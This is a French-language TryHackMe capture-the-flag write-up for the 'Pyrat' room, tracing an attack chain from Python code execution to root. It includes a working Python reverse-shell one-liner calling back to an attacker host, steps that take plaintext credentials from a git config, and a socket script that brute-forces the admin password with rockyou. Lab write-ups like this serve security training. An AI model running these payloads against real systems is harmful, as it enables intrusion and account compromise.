# Pyrat — TryHackMe

**Difficulté :** Easy | **OS :** Linux | **Thème :** RCE Python → git creds → brute-force endpoint admin → root

---

## Enumeration

```bash
nmap -sV -sC <TARGET_IP>
```

|Port|Service|
|---|---|
|22|SSH — OpenSSH 8.2p1|
|8000|HTTP — SimpleHTTP/0.6 Python/3.11.2|

Requête HTTP sur le port 8000 → réponse : `Try a more basic connection`

---

## Initial Access — RCE via PyRAT

Connexion brute avec `nc` → le serveur interprète directement du code Python.

```bash
nc <TARGET_IP> 8000
```

Envoyer du code Python directement dans la connexion. Reverse shell :

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")
```

Listener côté attaquant :

```bash
nc -lnvp 1337
```

Shell obtenu en tant que `www-data`.

> Alternative : envoyer `shell` directement dans la connexion nc (endpoint natif de PyRAT).

---

## Shell as think

```bash
cat /etc/passwd | grep bash
# → root, think
```

Répertoire `/opt/dev` appartient à `think` → contient un dépôt `.git`.

```bash
cat /opt/dev/.git/config
```

Le fichier config expose les credentials de `think` en clair dans la section `[credential]`.

```
[credential "https://github.com"]
    username = think
    password = <PASSWORD>
```

Connexion SSH :

```bash
ssh think@<TARGET_IP>
```

`user.txt` dans `/home/think/`.

---

## Privilege Escalation — Brute-force endpoint admin

### Analyse de la source

Mail dans `/var/mail/think` → root a installé PyRAT depuis le GitHub de l'auteur : `https://github.com/josemlwdf/PyRAT`

Depuis `/opt/dev`, inspecter l'historique git :

```bash
git log
git show <commit>   # révèle pyrat.py.old
```

Le code source révèle la logique de `switch_case` :

- `shell` → spawn shell direct
- `admin` → demande un mot de passe, si correct → shell admin (root)
- autre → `exec()` du code Python

Le mot de passe hardcodé dans l'ancienne version (`testpass`) ne fonctionne plus en prod.

### Script de brute-force

```python
import socket, sys

host = "<TARGET_IP>"
port = 8000
wordlist_path = "/usr/share/wordlists/rockyou.txt"

def try_password(password):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.sendall(b"admin\n")
    resp = s.recv(1024).decode("utf-8")
    if "Password:" in resp:
        s.sendall((password + "\n").encode("utf-8"))
        resp = s.recv(1024).decode("utf-8")
        s.close()
        if "Welcome Admin!!!" in resp:
            print(f"[+] Password found: {password}")
            return True
    s.close()
    return False

with open(wordlist_path, "r", encoding="latin-1") as f:
    for line in f:
        pw = line.strip()
        if try_password(pw):
            break
```

### Accès root

```bash
nc <TARGET_IP> 8000
admin
<PASSWORD_TROUVÉ>
# → Welcome Admin!!!
shell
# → shell root
```

`root.txt` dans `/root/`.

---

## Résumé de la chaîne d'attaque

```
nmap → port 8000 (PyRAT Python server)
→ nc + RCE Python → reverse shell www-data
→ /opt/dev/.git/config → creds think
→ SSH think → user.txt
→ /var/mail/think → mention PyRAT GitHub
→ git show → source pyrat.py.old → logique endpoint admin
→ brute-force password admin (rockyou)
→ nc admin shell → root.txt
```